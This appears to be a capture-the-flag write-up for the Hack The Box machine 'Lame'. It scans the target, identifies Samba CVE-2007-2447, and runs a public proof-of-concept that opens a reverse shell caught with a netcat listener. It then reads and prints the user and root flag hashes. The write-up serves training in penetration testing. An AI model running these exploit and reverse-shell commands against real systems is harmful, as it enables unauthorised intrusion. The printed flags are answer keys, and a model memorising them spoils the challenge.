{"title":"HTB - Lame","slug":"Lame","html":"<h1 id=\"lame---1010103\">Lame - 10.10.10.3</h1>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<p>command: </p>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -p- -Pn 10.10.10.3 -oA nmap/quick</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 04:56 EDT\nVerbosity Increased to 1.\nConnect Scan Timing: About 64.81% done; ETC: 05:04 (0:02:45 remaining)\nDiscovered open port 3632/tcp on 10.10.10.3\nVerbosity Decreased to 0.\nNmap scan report for 10.10.10.3\nHost is up (0.24s latency).\nNot shown: 65530 filtered ports\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3632/tcp open  distccd\n\nNmap done: 1 IP address (1 host up) scanned in 447.44 seconds</code></pre><h2 id=\"vulnerability-information\">Vulnerability Information</h2>\n<p>Searchsploit is used to search for a known exploit the samba version <strong>3.0.20</strong></p>\n<p>command: </p>\n<pre class=\"language-bash\"><code class=\"language-bash\">searchsploit samba 3.0.20</code></pre><p><img src=\"Lame.assets/image-20210423035311257.png\" alt=\"\"></p>\n<p><img src=\"Lame.assets/image-20210423030333503.png\" alt=\"\"></p>\n<p>After researching the exploit <strong>Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution</strong> , its CVE can be found on exploitdb website. </p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.exploit-db.com/exploits/16320\">Link</a>:  <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.exploit-db.com/exploits/16320\">https://www.exploit-db.com/exploits/16320</a> CVE: 2007-2447</p>\n<p><img src=\"Lame.assets/image-20210423040537738.png\" alt=\"\"></p>\n<p>Upon searching for the CVE in <a target=\"_blank\" rel=\"nofollow\" href=\"https://nvd.nist.gov/\">National Vulnerability Database</a>, it can be known on how does the payload work. </p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2007-2447\">Link</a>: <a target=\"_blank\" rel=\"nofollow\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2007-2447\">https://nvd.nist.gov/vuln/detail/CVE-2007-2447</a></p>\n<p><img src=\"Lame.assets/image-20210423041046805.png\" alt=\"\"></p>\n<p><strong>Vulnerability Explanation:</strong></p>\n<p>The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the &quot;username map  script&quot; smb.conf option is enabled, and allows remote authenticated  users to execute commands via shell metacharacters involving other  MS-RPC functions in the (2) remote printer and (3) file share  management.</p>\n<h2 id=\"exploitation\">Exploitation</h2>\n<p>When searching for <strong>cve-2007-2447 exploit</strong> on google, a github repository is found containing a python POC script.</p>\n<p><img src=\"Lame.assets/image-20210423050552798.png\" alt=\"\"> </p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2007-2447\">Link</a>: <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/amriunix/CVE-2007-2447\">https://github.com/amriunix/CVE-2007-2447</a></p>\n<p><img src=\"Lame.assets/image-20210423050643210.png\" alt=\"\"></p>\n<p>A python package needs to be installed to run the script.</p>\n<p>command:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">mkdir exploit\ncd exploit\ngit clone https://github.com/amriunix/CVE-2007-2447\npip install --user pysmb</code></pre><p><img src=\"Lame.assets/image-20210423050855031.png\" alt=\"\"></p>\n<p>After installing the exploit dependencies, the python exploit can now be ran.</p>\n<p>command:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">python3 usermap_script.py 10.10.10.3 139 10.10.14.3 8888\nrlwrap nc -lvnp 8888</code></pre><p>On the first pane, the exploit is being executed, and on the second one, a connection is received coming from the target.</p>\n<p><img src=\"Lame.assets/image-20210423055920733.png\" alt=\"\"></p>\n<p>After exploiting, the shell is already running as root.</p>\n<h3 id=\"usertxt\">User.txt</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">find /home -type f</code></pre><p><img src=\"Lame.assets/image-20210423060412613.png\" alt=\"\"></p>\n<p>the <strong>user.txt</strong> file is located in user <strong>makis</strong> home folder.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /home/makis/user.txt</code></pre><p><img src=\"Lame.assets/image-20210423060516976.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt flag: <code>43bf1c6bb6f868ad4e55452e7db7eeb1</code></p>\n</blockquote>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /root/root.txt</code></pre><p><img src=\"Lame.assets/image-20210423060921071.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt flag: <code>a8221b5e4e0a0535e87eae265190c232</code></p>\n</blockquote>\n","date":"2021-04-23","excerpt":"","printDate":"April 23, 2021","printReadingTime":"3 min read"}